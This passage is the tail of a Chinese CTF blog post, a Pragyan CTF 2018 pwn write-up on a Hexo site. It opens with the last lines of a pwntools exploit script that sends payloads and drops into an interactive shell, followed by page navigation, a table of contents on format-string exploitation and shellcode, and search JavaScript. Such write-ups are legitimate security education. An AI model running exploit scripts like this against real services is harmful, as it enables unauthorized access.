p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(t1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33332</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    p.recv()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(t2)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"># 格式化字符串</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/03/kernel_android/" rel="next" title="android kernel编译过程详细">
+                <i class="fa fa-chevron-left"></i> android kernel编译过程详细
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/05/pwn_fmtstr/" rel="prev" title="格式化字符串漏洞原理及湖湘杯pwn200 writeup">
+                格式化字符串漏洞原理及湖湘杯pwn200 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/sakura_heart.png"
+                alt="sakura" />
+            
+              <p class="site-author-name" itemprop="name">sakura</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">103</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://elphet.blogspot.com" title="bobb" target="_blank">bobb</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://thunderjie.github.io/" title="Thunderj" target="_blank">Thunderj</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://dwfault.github.io/" title="dwfalut" target="_blank">dwfalut</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pcat.cc/" title="pcat" target="_blank">pcat</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Old-school-hack-200pts"><span class="nav-number">1.</span> <span class="nav-text">Old school hack (200pts)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目描述"><span class="nav-number">1.1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接："><span class="nav-number">1.1.2.</span> <span class="nav-text">题目链接：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">1.2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#scanf变量覆盖"><span class="nav-number">1.2.1.</span> <span class="nav-text">scanf变量覆盖</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">1.3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-number">1.3.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输入密码"><span class="nav-number">1.3.2.</span> <span class="nav-text">输入密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#栈溢出"><span class="nav-number">1.3.3.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件读取函数"><span class="nav-number">1.3.4.</span> <span class="nav-text">文件读取函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#长度校验"><span class="nav-number">1.3.5.</span> <span class="nav-text">长度校验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">1.4.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">1.4.1.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定填充值"><span class="nav-number">1.4.2.</span> <span class="nav-text">确定填充值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.4.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unbreakable-encryption-350pts"><span class="nav-number">2.</span> <span class="nav-text">Unbreakable encryption (350pts)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目描述-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接"><span class="nav-number">2.1.2.</span> <span class="nav-text">题目链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识-1"><span class="nav-number">2.2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#格式化字符串漏洞原理"><span class="nav-number">2.2.1.</span> <span class="nav-text">格式化字符串漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意地址读"><span class="nav-number">2.2.2.</span> <span class="nav-text">任意地址读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意地址写"><span class="nav-number">2.2.3.</span> <span class="nav-text">任意地址写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64位格式化字符串"><span class="nav-number">2.2.4.</span> <span class="nav-text">64位格式化字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools"><span class="nav-number">2.2.5.</span> <span class="nav-text">pwntools</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fmtstr"><span class="nav-number">2.2.5.1.</span> <span class="nav-text">fmtstr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fmtstr-payload"><span class="nav-number">2.2.5.2.</span> <span class="nav-text">fmtstr_payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-1"><span class="nav-number">2.3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#静态链接"><span class="nav-number">2.3.2.</span> <span class="nav-text">静态链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序功能"><span class="nav-number">2.3.3.</span> <span class="nav-text">程序功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#栈溢出-1"><span class="nav-number">2.3.4.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#格式化字符串漏洞"><span class="nav-number">2.3.5.</span> <span class="nav-text">格式化字符串漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用-1"><span class="nav-number">2.4.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路-1"><span class="nav-number">2.4.1.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#准备shellcode"><span class="nav-number">2.4.2.</span> <span class="nav-text">准备shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#准备参数"><span class="nav-number">2.4.3.</span> <span class="nav-text">准备参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定偏移"><span class="nav-number">2.4.4.</span> <span class="nav-text">确定偏移</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">2.5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他exp-todo"><span class="nav-number">2.6.</span> <span class="nav-text">其他exp(todo)</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sakura</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://eternalsakura13.com/2018/03/05/pragyan/';
+          this.page.identifier = '2018/03/05/pragyan/';
+          this.page.title = 'pragyan ctf2018 pwn writeup';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
